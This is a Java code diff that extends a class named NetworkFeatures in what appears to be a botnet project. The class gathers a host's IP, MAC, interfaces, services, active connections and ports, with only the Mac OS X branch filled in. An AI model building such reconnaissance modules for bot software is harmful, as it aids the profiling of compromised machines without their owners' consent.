@@ -28,6 +28,9 @@ package com.acmutv.botnet.core.analysis;
 
 import com.acmutv.botnet.core.exception.BotAnalysisException;
 import com.acmutv.botnet.tool.net.ConnectionManager;
+import com.acmutv.botnet.tool.runtime.LinuxSysInfoTools;
+import com.acmutv.botnet.tool.runtime.MacOsxSysInfoTools;
+
 import lombok.AllArgsConstructor;
 import lombok.Data;
 import lombok.NoArgsConstructor;
@@ -47,37 +50,89 @@ import java.net.UnknownHostException;
 @NoArgsConstructor
 public class NetworkFeatures {
 
-  /**
-   * The IP address.
-   */
-  private String ip;
+	/**
+	 * The IP address.
+	 */
+	private String ip;
 
-  /**
-   * The MAC address.
-   */
-  private String MAC;
+	/**
+	 * The MAC address.
+	 */
+	private String MAC;
 
-  /**
-   * Returns local network features.
-   * @return local network features.
-   * @throws BotAnalysisException when some network features cannot be determined.
-   */
-  public static NetworkFeatures getLocal() throws BotAnalysisException {
-    String ip;
-    String mac;
+	/**
+	 * Current network information
+	 */
+	private String CurrentNetworkInformation;
 
-    try {
-      ip = ConnectionManager.getIP();
-    } catch (UnknownHostException exc) {
-      throw new BotAnalysisException("Cannot determine IP. %s", exc.getMessage());
-    }
+	/**
+	 * Network Services of the host
+	 */
+	private String NetworkServices;
 
-    try {
-      mac = ConnectionManager.getMAC();
-    } catch (UnknownHostException | SocketException exc) {
-      throw new BotAnalysisException("Cannot determine MAC. %s", exc.getMessage());
-    }
+	/**
+	 * Network Interfaces
+	 */
+	private String NetworkInterfaces;
 
-    return new NetworkFeatures(ip, mac);
-  }
+	/**
+	 * Active Connections
+	 */
+	private String ActiveConnections;
+
+	/**
+	 * Network Hardware Ports
+	 */
+	private String NetworkPorts;
+
+
+	/**
+	 * Returns local network features.
+	 * @return local network features.
+	 * @throws BotAnalysisException when some network features cannot be determined.
+	 */
+	public static NetworkFeatures getLocal() throws BotAnalysisException {
+
+		String osName = System.getProperty ("os.name");
+
+		String ip = null;
+		String mac = null;
+		String currentNetworkInformation = null;
+		String networkServices = null;
+		String networkInterfaces = null;
+		String activeConnections = null;
+		String networkPorts = null;
+
+
+		try {
+			ip = ConnectionManager.getIP();
+		} catch (UnknownHostException exc) {
+			throw new BotAnalysisException("Cannot determine IP. %s", exc.getMessage());
+		}
+
+		try {
+			mac = ConnectionManager.getMAC();
+		} catch (UnknownHostException | SocketException exc) {
+			throw new BotAnalysisException("Cannot determine MAC. %s", exc.getMessage());
+		}
+
+		if(osName.toUpperCase().equals("MAC OS X")){
+			MacOsxSysInfoTools osx = new MacOsxSysInfoTools();
+			currentNetworkInformation = osx.getCurrentNetworkInformation();
+			networkServices = osx.getLocalNetworkServices();
+			networkInterfaces = osx.getAllInterfaces();
+			activeConnections = osx.getAllActiveConnections();
+			networkPorts = osx.getNetworkHardwarePorts();
+			
+		}else if (osName.toUpperCase().equals("LINUX")){
+
+		}
+		else if (osName.toUpperCase().equals("WINDOWS")){
+
+		}else{
+
+		}
+
+		return new NetworkFeatures(ip, mac, currentNetworkInformation, networkServices, networkInterfaces, activeConnections,networkPorts);
+	}
 }
